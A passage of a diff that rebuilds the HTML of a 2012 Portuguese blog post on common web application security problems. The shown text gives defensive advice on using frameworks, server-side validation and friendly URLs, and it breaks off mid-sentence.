@@ -1,151 +1,506 @@
-<!DOCTYPE html><html lang=pt-br> <head><meta charset=utf-8><title>Problemas comuns de segurança em aplicações Web | Klaus Laube</title><meta name=author content="Klaus Peter Laube"><meta name=description content="Quando estamos desenvolvendo nossas aplicações Web, temos que “pensar” como um usuário mal-intencionado. Não somente para garantir o bom funcionamento da mesma, mas também para garantir a segurança e bem-estar dos “usuários civis” que consomem os nossos serviços."><meta name=robots content=index,follow><meta property=og:site_name content="Klaus Laube"><meta property=og:type content=website><meta name=keywords content="desenvolvimento, web, seguranca, xss, csrf, sql-injection, php-injection, django, php, codeigniter"><meta property=og:title content="Problemas comuns de segurança em aplicações Web"><meta property=og:description content="Quando estamos desenvolvendo nossas aplicações Web, temos que “pensar” como um usuário mal-intencionado. Não somente para garantir o bom funcionamento da mesma, mas também para garantir a segurança e bem-estar dos “usuários civis” que consomem os nossos serviços."><meta property=og:url content=https://klauslaube.com.br/2012/04/15/problemas-de-seguranca-em-aplicacoes-web.html><meta property=og:image content><meta property=fb:app_id content=262757647133878><meta name=google-site-verification content=xCq0H3B3JhkPcAdZ03J0vayijvH_g1rQVMZ_DVcMsQY><meta name=viewport content="width=device-width, initial-scale=1.0"><link rel=icon type=image/x-icon href=https://klauslaube.com.br/favicon.ico><link rel=alternate type=application/rss+xml title="Klaus Laube » Feed" href=https://klauslaube.com.br/feed/rss.xml><link rel=canonical href=https://klauslaube.com.br/2012/04/15/problemas-de-seguranca-em-aplicacoes-web.html><link rel=stylesheet href=https://unpkg.com/purecss@1.0.0/build/pure-min.css integrity=sha384-nn4HPE8lTHyVtfCBi5yW9d20FjT8BJwUXyWZT9InLYax14RDjBj46LmSztkmNP9w crossorigin=anonymous><link rel=stylesheet href=https://klauslaube.com.br/theme/css/styles.min.css?0830b1e2></head> <body> <div class="Page pure-g is-fullEntry"> <div class="PageHeader pure-u-1"> <nav class="pure-menu pure-menu-open pure-menu-horizontal"> <a href=https://klauslaube.com.br/index.html title="Home page" class="PageHeader-link pure-menu-heading pure-menu-link">Klaus<span class=u-highlighted>Laube</a> <ul class="PageHeader-menu pure-menu-list"> <li class=pure-menu-item> <a href=https://about.me/klauslaube class="PageHeader-menu-link pure-menu-link">Contato</a> </li> </ul> </nav> </div> <div class="PageContent pure-u-1"> <article class="Article u-box" itemscope itemtype=http://schema.org/BlogPosting> <div itemprop=image itemscope itemtype=http://schema.org/ImageObject> <meta itemprop=url content> </div> <span itemprop=mainEntityOfPage> <header> <h1 class=Article-title itemprop="headline name"> Problemas comuns de segurança em aplicações Web </h1> <p class=Article-meta> Por <span class=Article-author itemprop=author>Klaus Peter Laube</span>. <span class=Article-pubDate> Publicado em <time datetime=2012-04-15T18:03:48-03:00 itemprop=datePublished>15 Abr, 2012</time> </span> </p> </header> <div class=Article-content itemprop=articleBody> <img src=/images/blog/security.jpg alt=Segurança class=representative-image width=180 height=180> <p>Seria perfeito se o mundo fosse feito apenas de pessoas bem-intencionadas. Acontece que é mais fácil os alienígenas exterminarem a raça humana, do que o homem deixar de tirar proveito de alguma situação.</p> <!-- PELICAN_END_SUMMARY --> <p>Quando estamos desenvolvendo nossas aplicações <a href=https://klauslaube.com.br/tag/web.html title="Leia mais sobre Web"><em>web</em></a>, temos que “pensar” como um usuário mal-intencionado. Não somente para garantir o bom funcionamento da mesma, mas também para garantir a segurança e bem-estar dos “usuários civis” que consomem os nossos serviços.</p> <p>Vamos explorar alguns problemas relacionados a segurança, e mostrar como solucioná-los de forma simples e prática.</p> <h2>Use frameworks!</h2> <p>E esta é a minha primeira dica para você: use <em>frameworks</em> sempre que possível!</p> <p>Eles já possuem um conjunto de ferramentas que contornam problemas como <em>SQL Injection</em>, <em>XSS</em> e <em>CSRF</em>. Pessoas muito inteligentes já pensaram no problema e já solucionaram para você. Na maioria dos casos, mais de uma vez!</p> <p>Em alguns <em>frameworks</em>, como o <a href=https://klauslaube.com.br/tag/django.html title="Leia mais sobre Django"><em>Django</em></a> e <a href=https://klauslaube.com.br/tag/codeigniter.html title="Leia mais sobre Codeigniter"><em>Codeigniter</em></a>, essas ferramentas são quase “transparentes”, ou seja, você tem pouco (ou nenhum) trabalho para utilizá-las no cotidiano.</p> <p>Já trabalhei por muito tempo com “desenvolvimento from scratch”, e hoje posso apontar vários pontos de falhas em aplicações que produzi no passado. Os <em>frameworks</em> diminuem muito estes pontos, por isso vale a pena o seu uso.</p> <h2>Validações (nunca confie no usuário)</h2> <p>Como eu comecei com o <a href=https://klauslaube.com.br/tag/php.html title="Leia mais sobre PHP"><em>PHP</em></a>, sei muito bem que este é um problema comum em aplicações desenvolvidas por iniciantes.</p> <p><strong>Nunca confie no usuário</strong>, e principalmente <strong>nunca confie em validações realizadas pelo <a href=https://klauslaube.com.br/tag/javascript.html title="Leia mais sobre Javascript"><em>Javascript</em></a></strong>. Todo ponto de entrada de informação deve possuir uma validação no <em>server-side</em>, mesmo que exista uma validação no <em>client-side</em>. <strong>Lembre-se:</strong> Existem navegadores que não utilizam <em>Javascript</em>, e mesmo os que utilizam, permitem que o usuário desabilite esta função.</p> <p>No <em>Django</em>, podemos fazer validações de formulários através de <a href=https://docs.djangoproject.com/en/dev/topics/forms/ title="Conheça os Forms no Django"><em>Forms</em></a>. No <em>Codeigniter</em> fazemos através da <a href=http://codeigniter.com/user_guide/libraries/form_validation.html title="Veja como fazer validações de formulário no Codeigniter"><em>Form Validation Class</em></a>. Em <em>PHP</em> “puro”, podemos fazer validações através da <a href=http://pear.php.net/manual/en/package.validate.validate.intro.php title="Instale a Validate através da PEAR">biblioteca <em>Validate</em></a>.</p> <p>As ferramentas citadas acima são extremamente eficientes para ações realizadas via <em>POST</em>. Mas e quando temos parâmetros vindos da <em>URL</em>, através do método <em>GET</em>, qual é a melhor maneira de agirmos?</p> <h3>URLs seguras e amigáveis</h3> <p>Há um bom tempo que as “URLs amigáveis” deixaram de ser um diferencial nas aplicações <em>web</em> e tornaram-se item obrigatório. Além de trazer o benefício do <a href=http://pt.wikipedia.org/wiki/Otimiza%C3%A7%C3%A3o_para_motores_de_busca title="Leia mais sobre SEO no Wikipedia"><em>SEO</em></a>, elas podem ser uma grande aliada quando o assunto é segurança.</p> <p><em>URLs</em> que antes eram feitas dessa maneira:</p> <div class=highlight><pre><span></span>/blog.php?year<span class=o>=</span><span class=m>2012</span><span class=p>&amp;</span><span class=nv>month</span><span class=o>=</span><span class=m>12</span><span class=p>&amp;</span><span class=nv>day</span><span class=o>=</span><span class=m>21</span>
-</pre></div> <p>Podem ser reproduzidas desta forma:</p> <div class=highlight><pre><span></span>/blog/2012/12/21/
-</pre></div> <p>O mecanismo de rotas de alguns <em>frameworks</em> permite a utilização de expressões regulares na construção do caminho. Por exemplo, em <em>Django</em> temos o seguinte cenário:</p> <div class=highlight><pre><span></span><span class=c1># urls.py</span>
+<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta http-equiv="x-ua-compatible" content="ie=edge"/><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/><style data-href="/styles.493e6315ef3a09bc2f74.css">code[class*=language-],pre[class*=language-]{color:#000;background:none;text-shadow:0 1px #fff;font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-ms-hyphens:none;hyphens:none}code[class*=language-]::selection,code[class*=language-] ::selection,pre[class*=language-]::selection,pre[class*=language-] ::selection{text-shadow:none;background:#b3d4fc}@media print{code[class*=language-],pre[class*=language-]{text-shadow:none}}pre[class*=language-]{padding:1em;margin:.5em 0;overflow:auto}:not(pre)>code[class*=language-],pre[class*=language-]{background:#f5f2f0}:not(pre)>code[class*=language-]{padding:.1em;border-radius:.3em;white-space:normal}.token.cdata,.token.comment,.token.doctype,.token.prolog{color:#708090}.token.punctuation{color:#999}.token.namespace{opacity:.7}.token.boolean,.token.constant,.token.deleted,.token.number,.token.property,.token.symbol,.token.tag{color:#905}.token.attr-name,.token.builtin,.token.char,.token.inserted,.token.selector,.token.string{color:#690}.language-css .token.string,.style .token.string,.token.entity,.token.operator,.token.url{color:#9a6e3a;background:hsla(0,0%,100%,.5)}.token.atrule,.token.attr-value,.token.keyword{color:#07a}.token.class-name,.token.function{color:#dd4a68}.token.important,.token.regex,.token.variable{color:#e90}.token.bold,.token.important{font-weight:700}.token.italic{font-style:italic}.token.entity{cursor:help}</style><meta name="generator" content="Gatsby 2.20.12"/><link rel="sitemap" type="application/xml" href="/sitemap.xml"/><style data-styled="" data-styled-version="5.1.0">.dQgIel{display:inline-block;vertical-align:middle;overflow:hidden;}/*!sc*/
+data-styled.g1[id="sc-AxjAm"]{content:"dQgIel,"}/*!sc*/
+.dLmtYS{color:rgba(0,0,0,0.84);height:24px;width:24px;}/*!sc*/
+data-styled.g2[id="article-share__FacebookStyled-sc-1s9obkn-0"]{content:"dLmtYS,"}/*!sc*/
+.cXEKcd{color:rgba(0,0,0,0.84);height:24px;width:24px;}/*!sc*/
+data-styled.g3[id="article-share__LinkedinStyled-sc-1s9obkn-1"]{content:"cXEKcd,"}/*!sc*/
+.kBgYvV{color:rgba(0,0,0,0.84);height:24px;width:24px;}/*!sc*/
+data-styled.g4[id="article-share__TwitterStyled-sc-1s9obkn-2"]{content:"kBgYvV,"}/*!sc*/
+.jVnceN{color:rgba(0,0,0,0.84);height:24px;width:24px;}/*!sc*/
+data-styled.g5[id="article-share__WhatsappStyled-sc-1s9obkn-3"]{content:"jVnceN,"}/*!sc*/
+.hUktyW{display:inline-block;margin-right:8px;}/*!sc*/
+data-styled.g6[id="article-share__SocialLink-sc-1s9obkn-4"]{content:"hUktyW,"}/*!sc*/
+.hKQQPE{clear:both;margin-bottom:32px;}/*!sc*/
+@media (min-width:768px){.hKQQPE{clear:none;float:right;line-height:48px;}}/*!sc*/
+data-styled.g7[id="article-share__SocialWrapper-sc-1s9obkn-5"]{content:"hKQQPE,"}/*!sc*/
+.gKRNvs{margin-bottom:24px;}/*!sc*/
+data-styled.g8[id="article-tags__Tags-lfitfk-0"]{content:"gKRNvs,"}/*!sc*/
+.kdcwKK{background-color:#f4f4f4;color:rgba(0,0,0,0.54);display:inline-block;font-size:14px;margin:0 8px 8px 0;padding:8px 16px;-webkit-text-decoration:none;text-decoration:none;}/*!sc*/
+data-styled.g9[id="article-tags__Tag-lfitfk-1"]{content:"kdcwKK,"}/*!sc*/
+.gfJCPa{color:rgba(0,0,0,0.84);margin-bottom:4px;}/*!sc*/
+data-styled.g14[id="article__AuthorName-sc-1bof3w4-0"]{content:"gfJCPa,"}/*!sc*/
+.cZgAvk{clear:both;font-family:Georgia,"Times New Roman",Times,serif;font-size:18px;font-weight:300;-webkit-letter-spacing:-0.054px;-moz-letter-spacing:-0.054px;-ms-letter-spacing:-0.054px;letter-spacing:-0.054px;line-height:28px;margin-bottom:48px;}/*!sc*/
+@media (min-width:768px){.cZgAvk{font-size:20px;}}/*!sc*/
+.cZgAvk *{margin:0;margin-block-end:0;margin-block-start:0;padding:0;}/*!sc*/
+.cZgAvk h2,.cZgAvk h3,.cZgAvk h4{font-family:"Lucida Sans","Lucida Sans Regular","Lucida Grande","Lucida Sans Unicode",Geneva,Verdana,sans-serif;-webkit-letter-spacing:-0.66px;-moz-letter-spacing:-0.66px;-ms-letter-spacing:-0.66px;letter-spacing:-0.66px;margin-top:8px;margin-bottom:28px;}/*!sc*/
+@media (min-width:768px){.cZgAvk h2,.cZgAvk h3,.cZgAvk h4{margin-bottom:16px;}}/*!sc*/
+.cZgAvk figure,.cZgAvk .gatsby-highlight{left:-24px;position:relative;width:100vw;}/*!sc*/
+@media (min-width:768px){.cZgAvk figure,.cZgAvk .gatsby-highlight{left:0;width:auto;}}/*!sc*/
+.cZgAvk a{color:#c4170c;-webkit-text-decoration:none;text-decoration:none;}/*!sc*/
+.cZgAvk a:hover{-webkit-text-decoration:underline;text-decoration:underline;}/*!sc*/
+.cZgAvk blockquote{color:rgba(0,0,0,0.54);font-style:italic;}/*!sc*/
+.cZgAvk code{font-size:16px;}/*!sc*/
+.cZgAvk figcaption{color:rgba(0,0,0,0.54);font-size:16px;line-height:20px;padding:16px 24px 0;text-align:center;}/*!sc*/
+.cZgAvk h2{font-size:26px;font-weight:600;line-height:32px;margin-bottom:28px;}/*!sc*/
+.cZgAvk h3{color:#333;font-size:22px;font-weight:300;line-height:28px;}/*!sc*/
+.cZgAvk h4{color:rgba(0,0,0,0.54);font-size:16;font-weight:300;line-height:24px;}/*!sc*/
+.cZgAvk iframe{display:block;margin:0 auto 28px auto;}/*!sc*/
+@media (min-width:768px){.cZgAvk iframe{margin-bottom:42px;}}/*!sc*/
+.cZgAvk img{display:block;margin:0 auto;}/*!sc*/
+.cZgAvk p{margin-bottom:28px;}/*!sc*/
+@media (min-width:768px){.cZgAvk p{margin-bottom:42px;}}/*!sc*/
+.cZgAvk pre{font-size:16px;margin-bottom:28px;padding:24px 16px;}/*!sc*/
+@media (min-width:768px){.cZgAvk pre{margin-bottom:42px;}}/*!sc*/
+.cZgAvk ol,.cZgAvk ul{margin-left:28px;}/*!sc*/
+@media (min-width:768px){.cZgAvk ol,.cZgAvk ul{margin-bottom:42px;}}/*!sc*/
+.cZgAvk li{margin-bottom:8px;}/*!sc*/
+@media (min-width:768px){.cZgAvk li{margin-bottom:16px;}}/*!sc*/
+data-styled.g15[id="article__Content-sc-1bof3w4-1"]{content:"cZgAvk,"}/*!sc*/
+.lhlkLZ{border-top:1px solid #f4f4f4;margin-bottom:24px;padding-top:24px;}/*!sc*/
+data-styled.g16[id="article__DiscussionWrapper-sc-1bof3w4-2"]{content:"lhlkLZ,"}/*!sc*/
+.hnJNBS{-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;color:rgba(0,0,0,0.54);display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;float:left;font-size:14px;margin-bottom:32px;}/*!sc*/
+data-styled.g17[id="article__Meta-sc-1bof3w4-3"]{content:"hnJNBS,"}/*!sc*/
+.cTbbvU{-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;}/*!sc*/
+data-styled.g18[id="article__MetaText-sc-1bof3w4-4"]{content:"cTbbvU,"}/*!sc*/
+.lhqEXT{border-radius:60px;margin-right:16px;}/*!sc*/
+data-styled.g19[id="article__StyledAvatar-sc-1bof3w4-5"]{content:"lhqEXT,"}/*!sc*/
+.dtcUmd{color:rgba(0,0,0,0.84);font-weight:600;-webkit-letter-spacing:-0.93px;-moz-letter-spacing:-0.93px;-ms-letter-spacing:-0.93px;letter-spacing:-0.93px;margin:0 0 4px 0;font-size:30px;font-weight:400;margin-bottom:32px;}/*!sc*/
+@media (min-width:768px){.dtcUmd{font-size:40px;}}/*!sc*/
+data-styled.g20[id="article__StyledTitle-sc-1bof3w4-6"]{content:"dtcUmd,"}/*!sc*/
+.bfwjqj{margin:0 auto;max-width:640px;padding:0 24px;}/*!sc*/
+data-styled.g21[id="container-sc-1o2is99-0"]{content:"bfwjqj,"}/*!sc*/
+.iyjQQp{-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;color:#c4170c;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;font-family:Arial,Helvetica,sans-serif;height:36px;width:36px;}/*!sc*/
+data-styled.g22[id="page-header-brand__Brand-ofbkek-0"]{content:"iyjQQp,"}/*!sc*/
+.hPHtvI{display:none;}/*!sc*/
+@media (min-width:768px){.hPHtvI{display:block;}}/*!sc*/
+data-styled.g23[id="page-header-brand__BrandFragment-ofbkek-1"]{content:"hPHtvI,"}/*!sc*/
+.exgtKg{color:#333;display:inline-block;margin-left:4px;}/*!sc*/
+.exgtKg:first-child{margin-left:0;margin-right:4px;}/*!sc*/
+data-styled.g24[id="page-header-brand__Bracket-ofbkek-2"]{content:"exgtKg,"}/*!sc*/
+.fUa-dQJ{color:#333;width:22px;}/*!sc*/
+data-styled.g25[id="page-header__GreyMail-sc-1ef23a-0"]{content:"fUa-dQJ,"}/*!sc*/
+.GBaPr{box-shadow:0 -8px 16px 0 rgba(0,0,0,0.54);font-size:1.1rem;margin-bottom:24px;}/*!sc*/
+@media (min-width:768px){.GBaPr{margin-bottom:64px;}}/*!sc*/
+data-styled.g26[id="page-header__Header-sc-1ef23a-1"]{content:"GBaPr,"}/*!sc*/
+.ktLFvT{margin:0 auto;max-width:640px;padding:0 24px;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;height:56px;-webkit-box-pack:justify;-webkit-justify-content:space-between;-ms-flex-pack:justify;justify-content:space-between;max-width:974px;}/*!sc*/
+data-styled.g27[id="page-header__HeaderContainer-sc-1ef23a-2"]{content:"ktLFvT,"}/*!sc*/
+.gbnbN{-webkit-text-decoration:none;text-decoration:none;}/*!sc*/
+data-styled.g28[id="page-header__StyledLink-sc-1ef23a-3"]{content:"gbnbN,"}/*!sc*/
+.hJnaIf{-webkit-text-decoration:none;text-decoration:none;}/*!sc*/
+data-styled.g29[id="page-header__StyledA-sc-1ef23a-4"]{content:"hJnaIf,"}/*!sc*/
+.eZHcyp{border-top:1px solid #f4f4f4;color:rgba(0,0,0,0.54);font-size:14px;padding:24px 0;text-align:center;}/*!sc*/
+@media (min-width:768px){.eZHcyp{text-align:right;}}/*!sc*/
+data-styled.g30[id="page-footer__Footer-sc-1jesc4c-0"]{content:"eZHcyp,"}/*!sc*/
+.hCZhVV{color:rgba(0,0,0,0.84);-webkit-text-decoration:none;text-decoration:none;}/*!sc*/
+.hCZhVV:hover{-webkit-text-decoration:underline;text-decoration:underline;}/*!sc*/
+data-styled.g31[id="page-footer__Link-sc-1jesc4c-1"]{content:"hCZhVV,"}/*!sc*/
+body{color:rgba(0,0,0,0.84);font-family:Arial,Helvetica,sans-serif;margin:0;}/*!sc*/
+data-styled.g51[id="sc-global-eLbNMD1"]{content:"sc-global-eLbNMD1,"}/*!sc*/
+</style><title data-react-helmet="true">Problemas comuns de segurança em aplicações Web | Klaus Laube</title><meta data-react-helmet="true" name="description" content="Seria perfeito se o mundo fosse feito apenas de pessoas
+bem-intencionadas. Acontece que é mais fácil os alienígenas exterminarem
+a raça…"/><meta data-react-helmet="true" property="og:title" content="Problemas comuns de segurança em aplicações Web"/><meta data-react-helmet="true" property="og:description" content="Seria perfeito se o mundo fosse feito apenas de pessoas
+bem-intencionadas. Acontece que é mais fácil os alienígenas exterminarem
+a raça…"/><meta data-react-helmet="true" property="og:type" content="website"/><meta data-react-helmet="true" name="twitter:card" content="summary"/><meta data-react-helmet="true" name="twitter:creator" content="Klaus Peter Laube"/><meta data-react-helmet="true" name="twitter:title" content="Problemas comuns de segurança em aplicações Web"/><meta data-react-helmet="true" name="twitter:description" content="Seria perfeito se o mundo fosse feito apenas de pessoas
+bem-intencionadas. Acontece que é mais fácil os alienígenas exterminarem
+a raça…"/><meta data-react-helmet="true" name="keywords" content="desenvolvimento-web,segurança,xss,csrf,sql-injection,php-injection,django,php,codeigniter"/><meta data-react-helmet="true" property="og:image" content="https://klauslaube.com.br/static/1cd4b4725839683e40ab3a81772685f8/security.jpg"/><link rel="icon" href="/icons/icon-48x48.png?v=36b7df61fef254bef7f8fee13b1f890b"/><link rel="manifest" href="/manifest.webmanifest"/><meta name="theme-color" content="#663399"/><link rel="apple-touch-icon" sizes="48x48" href="/icons/icon-48x48.png?v=36b7df61fef254bef7f8fee13b1f890b"/><link rel="apple-touch-icon" sizes="72x72" href="/icons/icon-72x72.png?v=36b7df61fef254bef7f8fee13b1f890b"/><link rel="apple-touch-icon" sizes="96x96" href="/icons/icon-96x96.png?v=36b7df61fef254bef7f8fee13b1f890b"/><link rel="apple-touch-icon" sizes="144x144" href="/icons/icon-144x144.png?v=36b7df61fef254bef7f8fee13b1f890b"/><link rel="apple-touch-icon" sizes="192x192" href="/icons/icon-192x192.png?v=36b7df61fef254bef7f8fee13b1f890b"/><link rel="apple-touch-icon" sizes="256x256" href="/icons/icon-256x256.png?v=36b7df61fef254bef7f8fee13b1f890b"/><link rel="apple-touch-icon" sizes="384x384" href="/icons/icon-384x384.png?v=36b7df61fef254bef7f8fee13b1f890b"/><link rel="apple-touch-icon" sizes="512x512" href="/icons/icon-512x512.png?v=36b7df61fef254bef7f8fee13b1f890b"/><link rel="alternate" type="application/rss+xml" title="Klaus Laube" href="/feed/rss.xml"/><link as="script" rel="preload" href="/webpack-runtime-74a6d0a7c3b7aca6f059.js"/><link as="script" rel="preload" href="/framework-15c64f04ece7e16d9319.js"/><link as="script" rel="preload" href="/styles-72b9aca6a03bf971c27e.js"/><link as="script" rel="preload" href="/app-e7e259d06d29a943bae9.js"/><link as="script" rel="preload" href="/commons-d19a5247b9c341fd9cf4.js"/><link as="script" rel="preload" href="/component---src-templates-blog-post-js-7be79c03a887a02ef403.js"/><link as="fetch" rel="preload" href="/page-data/2012/04/15/problemas-de-seguranca-em-aplicacoes-web.html/page-data.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/app-data.json" crossorigin="anonymous"/></head><body><div id="___gatsby"><div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper"><div class="page-header__Header-sc-1ef23a-1 GBaPr"><div class="container-sc-1o2is99-0 page-header__HeaderContainer-sc-1ef23a-2 ktLFvT"><a class="page-header__StyledLink-sc-1ef23a-3 gbnbN" href="/"><div class="page-header-brand__Brand-ofbkek-0 iyjQQp"><span class="page-header-brand__Bracket-ofbkek-2 exgtKg">{</span>k<span class="page-header-brand__BrandFragment-ofbkek-1 hPHtvI">laus</span>l<span class="page-header-brand__BrandFragment-ofbkek-1 hPHtvI">aube</span><span class="page-header-brand__Bracket-ofbkek-2 exgtKg">}</span></div></a><div><a href="https://about.me/klauslaube" title="Contato" class="page-header__StyledA-sc-1ef23a-4 hJnaIf"><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false" fill="none" xmlns="http://www.w3.org/2000/svg" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" class="sc-AxjAm dQgIel page-header__GreyMail-sc-1ef23a-0 fUa-dQJ"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg></a></div></div></div><div><div class="container-sc-1o2is99-0 bfwjqj"><h1 class="typograph__Title-sc-4kf6ch-1 article__StyledTitle-sc-1bof3w4-6 dtcUmd">Problemas comuns de segurança em aplicações Web</h1><div class="article__Meta-sc-1bof3w4-3 hnJNBS"><img src="https://en.gravatar.com/userimage/12163112/d3ae0c6239980b01ff1f1730b65c2ebe.jpg" width="48" height="48" alt="Avatar" class="avatar-sc-46srdf-0 article__StyledAvatar-sc-1bof3w4-5 lhqEXT"/><div class="article__MetaText-sc-1bof3w4-4 cTbbvU"><div class="article__AuthorName-sc-1bof3w4-0 gfJCPa">Klaus Peter Laube</div>15 de Abril de 2012<!-- --> - <!-- -->16 minutos<!-- --> de leitura</div></div><div class="article-share__SocialWrapper-sc-1s9obkn-5 hKQQPE"><a href="https://twitter.com/intent/tweet?url=https://klauslaube.com.br/2012/04/15/problemas-de-seguranca-em-aplicacoes-web.html&amp;text=Problemas comuns de segurança em aplicações Web" target="_blank" rel="noreferrer" title="Compartilhe no Twitter" class="article-share__SocialLink-sc-1s9obkn-4 hUktyW"><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false" fill="currentColor" xmlns="http://www.w3.org/2000/svg" class="sc-AxjAm dQgIel article-share__TwitterStyled-sc-1s9obkn-2 kBgYvV"><path d="M19.633 7.997c.013.175.013.349.013.523 0 5.325-4.053 11.461-11.46 11.461-2.282 0-4.402-.661-6.186-1.809.324.037.636.05.973.05a8.07 8.07 0 005.001-1.721 4.036 4.036 0 01-3.767-2.793c.249.037.499.062.761.062.361 0 .724-.05 1.061-.137a4.027 4.027 0 01-3.23-3.953v-.05c.537.299 1.16.486 1.82.511a4.022 4.022 0 01-1.796-3.354c0-.748.199-1.434.548-2.032a11.457 11.457 0 008.306 4.215c-.062-.3-.1-.611-.1-.923a4.026 4.026 0 014.028-4.028c1.16 0 2.207.486 2.943 1.272a7.957 7.957 0 002.556-.973 4.02 4.02 0 01-1.771 2.22 8.073 8.073 0 002.319-.624 8.645 8.645 0 01-2.019 2.083z"></path></svg></a><a href="https://www.facebook.com/sharer/sharer.php?u=https://klauslaube.com.br/2012/04/15/problemas-de-seguranca-em-aplicacoes-web.html" target="_blank" rel="noreferrer" title="Compartilhe no Facebook" class="article-share__SocialLink-sc-1s9obkn-4 hUktyW"><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false" fill="currentColor" xmlns="http://www.w3.org/2000/svg" class="sc-AxjAm dQgIel article-share__FacebookStyled-sc-1s9obkn-0 dLmtYS"><path d="M20 3H4a1 1 0 00-1 1v16a1 1 0 001 1h8.615v-6.96h-2.338v-2.725h2.338v-2c0-2.325 1.42-3.592 3.5-3.592.699-.002 1.399.034 2.095.107v2.42h-1.435c-1.128 0-1.348.538-1.348 1.325v1.735h2.697l-.35 2.725h-2.348V21H20a1 1 0 001-1V4a1 1 0 00-1-1z"></path></svg></a><a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://klauslaube.com.br/2012/04/15/problemas-de-seguranca-em-aplicacoes-web.html&amp;title=Problemas comuns de segurança em aplicações Web" target="_blank" rel="noreferrer" title="Compartilhe no Linkedin" class="article-share__SocialLink-sc-1s9obkn-4 hUktyW"><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false" fill="currentColor" xmlns="http://www.w3.org/2000/svg" class="sc-AxjAm dQgIel article-share__LinkedinStyled-sc-1s9obkn-1 cXEKcd"><path d="M20 3H4a1 1 0 00-1 1v16a1 1 0 001 1h16a1 1 0 001-1V4a1 1 0 00-1-1zM8.339 18.337H5.667v-8.59h2.672v8.59zM7.003 8.574a1.548 1.548 0 110-3.096 1.548 1.548 0 010 3.096zm11.335 9.763h-2.669V14.16c0-.996-.018-2.277-1.388-2.277-1.39 0-1.601 1.086-1.601 2.207v4.248h-2.667v-8.59h2.56v1.174h.037c.355-.675 1.227-1.387 2.524-1.387 2.704 0 3.203 1.778 3.203 4.092v4.71z"></path></svg></a><a href="https://api.whatsapp.com/send?text=https://klauslaube.com.br/2012/04/15/problemas-de-seguranca-em-aplicacoes-web.html" target="_blank" rel="noreferrer" title="Compartilhe no Whatsapp" class="article-share__SocialLink-sc-1s9obkn-4 hUktyW"><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false" fill="currentColor" xmlns="http://www.w3.org/2000/svg" class="sc-AxjAm dQgIel article-share__WhatsappStyled-sc-1s9obkn-3 jVnceN"><path fill-rule="evenodd" d="M18.403 5.633A8.919 8.919 0 0012.053 3c-4.948 0-8.976 4.027-8.978 8.977 0 1.582.413 3.126 1.198 4.488L3 21.116l4.759-1.249a8.981 8.981 0 004.29 1.093h.004c4.947 0 8.975-4.027 8.977-8.977a8.926 8.926 0 00-2.627-6.35m-6.35 13.812h-.003a7.446 7.446 0 01-3.798-1.041l-.272-.162-2.824.741.753-2.753-.177-.282a7.448 7.448 0 01-1.141-3.971c.002-4.114 3.349-7.461 7.465-7.461a7.413 7.413 0 015.275 2.188 7.42 7.42 0 012.183 5.279c-.002 4.114-3.349 7.462-7.461 7.462m4.093-5.589c-.225-.113-1.327-.655-1.533-.73-.205-.075-.354-.112-.504.112s-.58.729-.711.879-.262.168-.486.056-.947-.349-1.804-1.113c-.667-.595-1.117-1.329-1.248-1.554s-.014-.346.099-.458c.101-.1.224-.262.336-.393.112-.131.149-.224.224-.374s.038-.281-.019-.393c-.056-.113-.505-1.217-.692-1.666-.181-.435-.366-.377-.504-.383a9.65 9.65 0 00-.429-.008.826.826 0 00-.599.28c-.206.225-.785.767-.785 1.871s.804 2.171.916 2.321c.112.15 1.582 2.415 3.832 3.387.536.231.954.369 1.279.473.537.171 1.026.146 1.413.089.431-.064 1.327-.542 1.514-1.066.187-.524.187-.973.131-1.067-.056-.094-.207-.151-.43-.263" clip-rule="evenodd"></path></svg></a></div><div class="article__Content-sc-1bof3w4-1 cZgAvk"><p>Seria perfeito se o mundo fosse feito apenas de pessoas
+bem-intencionadas. Acontece que é mais fácil os alienígenas exterminarem
+a raça humana, do que o homem deixar de tirar proveito de alguma
+situação.</p>
+<p>Quando estamos desenvolvendo nossas aplicações <a href="/tag/web.html" title="Leia mais sobre Web"><em>web</em></a>, temos que
+“pensar” como um usuário mal-intencionado. Não somente para garantir o
+bom funcionamento da mesma, mas também para garantir a segurança e
+bem-estar dos “usuários civis” que consomem os nossos serviços.</p>
+<p>Vamos explorar alguns problemas relacionados a segurança, e mostrar como
+solucioná-los de forma simples e prática.</p>
+<h2>Use frameworks!</h2>
+<p>E esta é a minha primeira dica para você: use <em>frameworks</em> sempre que
+possível!</p>
+<p>Eles já possuem um conjunto de ferramentas que contornam problemas como
+<em>SQL Injection</em>, <em>XSS</em> e <em>CSRF</em>. Pessoas muito inteligentes já pensaram no
+problema e já solucionaram para você. Na maioria dos casos, mais de uma vez!</p>
+<p>Em alguns <em>frameworks</em>, como o <a href="/tag/django.html" title="Leia mais sobre Django"><em>Django</em></a> e <a href="/tag/codeigniter.html" title="Leia mais sobre Codeigniter"><em>Codeigniter</em></a>, essas
+ferramentas são quase “transparentes”, ou seja, você tem pouco (ou
+nenhum) trabalho para utilizá-las no cotidiano.</p>
+<p>Já trabalhei por muito tempo com “desenvolvimento from scratch”, e hoje
+posso apontar vários pontos de falhas em aplicações que produzi no
